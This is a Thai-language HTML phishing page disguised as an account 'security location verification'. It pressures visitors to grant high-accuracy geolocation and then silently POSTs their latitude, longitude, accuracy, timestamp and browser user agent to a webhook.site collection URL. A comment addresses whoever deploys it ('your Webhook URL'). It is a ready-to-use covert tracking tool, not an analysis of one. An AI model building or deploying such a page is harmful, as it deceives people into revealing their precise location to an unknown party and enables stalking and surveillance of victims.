<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ระบบยืนยันตำแหน่งเพื่อความปลอดภัย</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px; background-color: #f4f4f4; }
        .container { background: white; padding: 30px; border-radius: 10px; shadow: 0 4px 6px rgba(0,0,0,0.1); }
        button { background-color: #007bff; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 16px; }
        button:hover { background-color: #0056b3; }
    </style>
</head>
<body>
    <div class="container">
        <h2>กรุณายืนยันตำแหน่งของคุณ</h2>
        <p>เพื่อดำเนินการต่อ โปรดกดปุ่มยืนยันตำแหน่งปัจจุบันเพื่อความปลอดภัยของบัญชีท่าน</p>
        <button onclick="getLocation()">ยืนยันตำแหน่ง</button>
    </div>

    <script>
        function getLocation() {
            if (navigator.geolocation) {
                // ตั้งค่าดึงพิกัดแบบแม่นยำสูงสุดและเพิ่ม Timeout เป็น 10 วินาที
                const options = {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                };
                navigator.geolocation.getCurrentPosition(sendPosition, showError, options);
            } else {
                alert("Browser ของท่านไม่รองรับการระบุตำแหน่ง");
            }
        }

        function sendPosition(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const accuracy = position.coords.accuracy;

            // ส่งข้อมูลไปยัง Webhook URL ของคุณ
            fetch("https://webhook.site/d8654c83-3367-4d22-9448-73772f66ee88", {
                method: "POST",
                mode: "no-cors",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    latitude: lat,
                    longitude: lon,
                    accuracy: accuracy,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent
                })
            }).then(() => {
                alert("ยืนยันตำแหน่งสำเร็จแล้ว ขอบคุณครับ");
                // สามารถใส่ลิงก์ให้ Redirect ไปหน้าอื่นหลังส่งเสร็จได้ที่นี่
            }).catch(err => console.log("Error:", err));
        }

        function showError(error) {
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    alert("ท่านต้องกด 'อนุญาต' (Allow) เพื่อยืนยันพิกัดความปลอดภัย");
                    break;
                case error.POSITION_UNAVAILABLE:
                    alert("ไม่สามารถระบุตำแหน่งได้ในขณะนี้");
                    break;
                case error.TIMEOUT:
                    alert("การขอพิกัดใช้เวลานานเกินไป กรุณาลองใหม่");
                    break;
            }
        }
    </script>
</body>
</html>
